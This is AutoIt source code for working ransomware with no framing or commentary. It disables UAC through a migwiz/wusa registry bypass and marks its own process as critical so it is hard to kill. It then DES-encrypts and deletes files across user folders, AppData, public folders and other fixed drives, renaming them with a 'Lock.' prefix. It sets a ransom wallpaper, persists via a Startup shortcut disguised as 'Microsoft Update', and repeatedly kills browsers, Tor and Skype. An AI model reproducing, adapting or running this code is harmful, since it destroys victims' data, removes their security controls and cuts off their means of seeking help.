#NoTrayIcon
Global Const $prov_rsa_full = 1
Global Const $prov_rsa_aes = 24
Global Const $crypt_verifycontext = -268435456
Global Const $crypt_exportable = 1
Global Const $crypt_userdata = 1
Global Const $calg_md5 = 32771
Global Const $calg_des = 26113
Global Const $calg_userkey = 0
Global $__g_acryptinternaldata[3]

Func _crypt_startup()
	If __crypt_refcount() = 0 Then
		Local $hadvapi32 = DllOpen("Advapi32.dll")
		If @error Then Return SetError(1, 0, False)
		__crypt_dllhandleset($hadvapi32)
		Local $aret
		Local $iproviderid = $prov_rsa_aes
		If @OSVersion = "WIN_2000" Then $iproviderid = $prov_rsa_full
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptAcquireContext", "handle*", 0, "ptr", 0, "ptr", 0, "dword", $iproviderid, "dword", $crypt_verifycontext)
		If @error OR NOT $aret[0] Then
			DllClose(__crypt_dllhandle())
			Return SetError(2, 0, False)
		Else
			__crypt_contextset($aret[1])
		EndIf
	EndIf
	__crypt_refcountinc()
	Return True
EndFunc

Func _crypt_shutdown()
	__crypt_refcountdec()
	If __crypt_refcount() = 0 Then
		DllCall(__crypt_dllhandle(), "bool", "CryptReleaseContext", "handle", __crypt_context(), "dword", 0)
		DllClose(__crypt_dllhandle())
	EndIf
EndFunc

Func _crypt_derivekey($vpassword, $ialg_id, $ihash_alg_id = $calg_md5)
	Local $aret
	Local $hcrypthash
	Local $hbuff
	Local $ierror
	Local $vreturn
	_crypt_startup()
	Do
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptCreateHash", "handle", __crypt_context(), "uint", $ihash_alg_id, "ptr", 0, "dword", 0, "handle*", 0)
		If @error OR NOT $aret[0] Then
			$ierror = 1
			$vreturn = -1
			ExitLoop
		EndIf
		$hcrypthash = $aret[5]
		$hbuff = DllStructCreate("byte[" & BinaryLen($vpassword) & "]")
		DllStructSetData($hbuff, 1, $vpassword)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptHashData", "handle", $hcrypthash, "struct*", $hbuff, "dword", DllStructGetSize($hbuff), "dword", $crypt_userdata)
		If @error OR NOT $aret[0] Then
			$ierror = 2
			$vreturn = -1
			ExitLoop
		EndIf
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptDeriveKey", "handle", __crypt_context(), "uint", $ialg_id, "handle", $hcrypthash, "dword", $crypt_exportable, "handle*", 0)
		If @error OR NOT $aret[0] Then
			$ierror = 3
			$vreturn = -1
			ExitLoop
		EndIf
		$ierror = 0
		$vreturn = $aret[5]
	Until True
	If $hcrypthash <> 0 Then DllCall(__crypt_dllhandle(), "bool", "CryptDestroyHash", "handle", $hcrypthash)
	Return SetError($ierror, 0, $vreturn)
EndFunc

Func _crypt_destroykey($hcryptkey)
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptDestroyKey", "handle", $hcryptkey)
	Local $nerror = @error
	_crypt_shutdown()
	If $nerror OR NOT $aret[0] Then
		Return SetError(1, 0, False)
	Else
		Return SetError(0, 0, True)
	EndIf
EndFunc

Func _crypt_encryptdata($vdata, $vcryptkey, $ialg_id, $ffinal = True)
	Local $hbuff
	Local $ierror
	Local $vreturn
	Local $reqbuffsize
	Local $aret
	_crypt_startup()
	Do
		If $ialg_id <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialg_id)
			If @error Then
				$ierror = 1
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $ffinal, "dword", 0, "ptr", 0, "dword*", BinaryLen($vdata), "dword", 0)
		If @error OR NOT $aret[0] Then
			$ierror = 2
			$vreturn = -1
			ExitLoop
		EndIf
		$reqbuffsize = $aret[6]
		$hbuff = DllStructCreate("byte[" & $reqbuffsize & "]")
		DllStructSetData($hbuff, 1, $vdata)
		$aret = DllCall(__crypt_dllhandle(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $ffinal, "dword", 0, "struct*", $hbuff, "dword*", BinaryLen($vdata), "dword", DllStructGetSize($hbuff))
		If @error OR NOT $aret[0] Then
			$ierror = 3
			$vreturn = -1
			ExitLoop
		EndIf
		$ierror = 0
		$vreturn = DllStructGetData($hbuff, 1)
	Until True
	If $ialg_id <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	Return SetError($ierror, 0, $vreturn)
EndFunc

Func _crypt_encryptfile($ssourcefile, $sdestinationfile, $vcryptkey, $ialg_id)
	Local $hinfile, $houtfile
	Local $ierror = 0, $vreturn = True
	Local $btempdata
	Local $ifilesize = FileGetSize($ssourcefile)
	Local $iread = 0
	_crypt_startup()
	Do
		If $ialg_id <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialg_id)
			If @error Then
				$ierror = 1
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$hinfile = FileOpen($ssourcefile, 16)
		If @error Then
			$ierror = 2
			$vreturn = -1
			ExitLoop
		EndIf
		$houtfile = FileOpen($sdestinationfile, 26)
		If @error Then
			$ierror = 3
			$vreturn = -1
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hinfile, 1024 * 1024)
			$iread += BinaryLen($btempdata)
			If $iread = $ifilesize Then
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, True)
				If @error Then
					$ierror = 4
					$vreturn = -1
				EndIf
				FileWrite($houtfile, $btempdata)
				ExitLoop 2
			Else
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, False)
				If @error Then
					$ierror = 5
					$vreturn = -1
					ExitLoop 2
				EndIf
				FileWrite($houtfile, $btempdata)
			EndIf
		Until False
	Until True
	If $ialg_id <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	If $hinfile <> -1 Then FileClose($hinfile)
	If $houtfile <> -1 Then FileClose($houtfile)
	Return SetError($ierror, 0, $vreturn)
EndFunc

Func __crypt_refcount()
	Return $__g_acryptinternaldata[0]
EndFunc

Func __crypt_refcountinc()
	$__g_acryptinternaldata[0] += 1
EndFunc

Func __crypt_refcountdec()
	If $__g_acryptinternaldata[0] > 0 Then $__g_acryptinternaldata[0] -= 1
EndFunc

Func __crypt_dllhandle()
	Return $__g_acryptinternaldata[1]
EndFunc

Func __crypt_dllhandleset($hadvapi32)
	$__g_acryptinternaldata[1] = $hadvapi32
EndFunc

Func __crypt_context()
	Return $__g_acryptinternaldata[2]
EndFunc

Func __crypt_contextset($hcryptcontext)
	$__g_acryptinternaldata[2] = $hcryptcontext
EndFunc

Func _filelisttoarray($spath, $sfilter = "*", $iflag = 0)
	Local $hsearch, $sfile, $sfilelist, $sdelim = "|"
	$spath = StringRegExpReplace($spath, "[\\/]+\z", "") & "\"
	If NOT FileExists($spath) Then Return SetError(1, 1, "")
	If StringRegExp($sfilter, "[\\/:><\|]|(?s)\A\s*\z") Then Return SetError(2, 2, "")
	If NOT ($iflag = 0 OR $iflag = 1 OR $iflag = 2) Then Return SetError(3, 3, "")
	$hsearch = FileFindFirstFile($spath & $sfilter)
	If @error Then Return SetError(4, 4, "")
	While 1
		$sfile = FileFindNextFile($hsearch)
		If @error Then ExitLoop
		If ($iflag + @extended = 2) Then ContinueLoop
		$sfilelist &= $sdelim & $sfile
	WEnd
	FileClose($hsearch)
	If NOT $sfilelist Then Return SetError(4, 4, "")
	Return StringSplit(StringTrimLeft($sfilelist, 1), "|")
EndFunc

Global Const $hgdi_error = Ptr(-1)
Global Const $invalid_handle_value = Ptr(-1)
Global Const $kf_extended = 256
Global Const $kf_altdown = 8192
Global Const $kf_up = 32768
Global Const $llkhf_extended = BitShift($kf_extended, 8)
Global Const $llkhf_altdown = BitShift($kf_altdown, 8)
Global Const $llkhf_up = BitShift($kf_up, 8)

Func _winapi_systemparametersinfo($iaction, $iparam = 0, $vparam = 0, $iwinini = 0)
	Local $aresult = DllCall("user32.dll", "bool", "SystemParametersInfoW", "uint", $iaction, "uint", $iparam, "ptr", $vparam, "uint", $iwinini)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Local $spi_setdeskwallpaper = 20
FileDelete(@TempDir & "/wl.jpg")
Local $bt
$bt = 0
FileInstall("32.cab", @TempDir & "/32.cab")
FileInstall("64.cab", @TempDir & "/64.cab")
_winapi_wow64enablewow64fsredirection(False)
FileDelete(@TempDir & "\888.vbs")
Sleep(300)
If @OSArch = "X86" Then
	RunWait(@ComSpec & " /c wusa " & @TempDir & "\32.cab /quiet /extract:" & @WindowsDir & "\system32\migwiz\  & exit", @TempDir, @SW_HIDE)
	FileWrite(@TempDir & "\888.vbs", 'File = "C:\Windows\System32\cmd.exe"' & @CRLF & 'Set shll = CreateObject("Wscript.Shell")' & @CRLF & 'shll.run("C:\Windows\System32\migwiz\migwiz.exe " & File & " /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d ' & "0" & ' /f"),0,false')
	Sleep(2000)
	ShellExecute(@TempDir & "\888.vbs")
ElseIf @OSArch = "X64" Then
	RunWait(@ComSpec & " /c wusa " & @TempDir & "\64.cab /quiet /extract:" & @WindowsDir & "\system32\migwiz\ & exit", @TempDir, @SW_HIDE)
	FileWrite(@TempDir & "\888.vbs", 'File = "C:\Windows\System32\cmd.exe"' & @CRLF & 'Set shll = CreateObject("Wscript.Shell")' & @CRLF & 'shll.run("C:\Windows\System32\migwiz\migwiz.exe " & File & " /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d ' & "0" & ' /f"),0,false')
	Sleep(2000)
	ShellExecute(@TempDir & "\888.vbs")
EndIf

Func _winapi_wow64enablewow64fsredirection($benable)
	Local $aret = DllCall("kernel32.dll", "boolean", "Wow64EnableWow64FsRedirection", "boolean", $benable)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aret[0]
EndFunc

snonkillableprocess()

Func snonkillableprocess()
	Local $sprocesshandle, $ssignedvalue, $processiopriority, $sprocessinformationlength, $sstruct
	If NOT @Compiled Then Exit
	$sprocesshandle = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
	$ssignedvalue = -2147421911
	$processiopriority = 33
	$sprocessinformationlength = 4
	$sstruct = DllStructCreate("Byte[4]")
	DllStructSetData($sstruct, 1, $ssignedvalue)
	$sret = DllCall("ntdll.dll", "none", "ZwSetInformationProcess", "int", $sprocesshandle[0], "int", $processiopriority, "int", DllStructGetPtr($sstruct), "int", $sprocessinformationlength)
EndFunc

$y = _filelisttoarray(@DesktopDir, "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@DesktopDir & "/" & $y[$i], @DesktopDir & "/Lock." & $dd1, "888", $calg_des)
			FileDelete(@DesktopDir & "/" & $y[$i])
			DirRemove(@DesktopDir & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "/AppData/Roaming", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "/AppData/Roaming/" & $y[$i], @UserProfileDir & "/AppData/Roaming/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "/AppData/Roaming/" & $y[$i])
			DirRemove(@UserProfileDir & "/AppData/Roaming/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "/AppData/Local", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "/AppData/Local/" & $y[$i], @UserProfileDir & "/AppData/Local/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "/AppData/Local/" & $y[$i])
			DirRemove(@UserProfileDir & "/AppData/Local/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = DriveGetDrive("FIXED")
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If $y[$i] <> "c:" Then
			$ys = _filelisttoarray($y[$i], "*.*", $bt)
			If $ys <> "" AND $ys <> @error AND $ys <> -1 Then
				For $is = 1 To $ys[0] Step +1
					If NOT StringInStr($ys[$is], "Lock.") Then
						$dd1 = StringReplace($ys[$is], "Fixed.", "")
						_crypt_encryptfile($y[$i] & "/" & $ys[$is], $y[$i] & "/Lock." & $dd1, "888", $calg_des)
						FileDelete($y[$i] & "/" & $ys[$is])
						DirRemove($y[$i] & "/" & $ys[$is], 1)
					EndIf
				Next
			EndIf
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "\Music", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "\Music" & "\" & $y[$i], @UserProfileDir & "\Music" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "\Music" & "\" & $y[$i])
			DirRemove(@UserProfileDir & "\Music" & "\" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "\Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "\Pictures" & "/" & $y[$i], @UserProfileDir & "\Pictures" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "\Pictures" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "\Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "\Videos" & "/" & $y[$i], @UserProfileDir & "\Videos" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "\Videos" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray(@UserProfileDir & "\Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile(@UserProfileDir & "\Documents" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete(@UserProfileDir & "\Documents" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray("C:\Users\Public\Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile("C:\Users\Public\Documents" & "/" & $y[$i], "C:\Users\Public\Documents" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete("C:\Users\Public\Documents" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray("C:\Users\Public\Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile("C:\Users\Public\Pictures" & "/" & $y[$i], "C:\Users\Public\Pictures" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete("C:\Users\Public\Pictures" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
$y = _filelisttoarray("C:\Users\Public\Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "Lock.") Then
			$dd1 = StringReplace($y[$i], "Fixed.", "")
			_crypt_encryptfile("C:\Users\Public\Videos" & "/" & $y[$i], "C:\Users\Public\Videos" & "/Lock." & $dd1, "888", $calg_des)
			FileDelete("C:\Users\Public\Videos" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf
FileWrite(@TempDir & "/8x8x8", "")
FileInstall("y7t.jpg", @TempDir & "\wl.jpg")
While 1
	If NOT FileExists(@TempDir & "/8x8x8") Then ExitLoop
	Sleep(1000)
	RegWrite("HKCU\Control Panel\Desktop", "Wallpaper", "REG_SZ", @TempDir & "\wl.jpg")
	_winapi_systemparametersinfo($spi_setdeskwallpaper, 0)
	If NOT FileExists(@StartupDir & "/Microsoft Update.lnk") Then
		FileCopy(@ScriptFullPath, @TempDir & "\x.exe")
		FileCreateShortcut(@TempDir & "/x.exe", @StartupDir & "/Microsoft Update.lnk", @TempDir)
	EndIf
	If ProcessExists("chrome.exe") Then
		ProcessClose("chrome.exe")
	EndIf
	If ProcessExists("firefox.exe") Then
		ProcessClose("firefox.exe")
	EndIf
	If ProcessExists("iexplore.exe") Then
		ProcessClose("iexplore.exe")
	EndIf
	If ProcessExists("opera.exe") Then
		ProcessClose("opera.exe")
	EndIf
	If ProcessExists("tor.exe") Then
		ProcessClose("tor.exe")
	EndIf
	If ProcessExists("skype.exe") Then
		ProcessClose("skype.exe")
	EndIf
WEnd
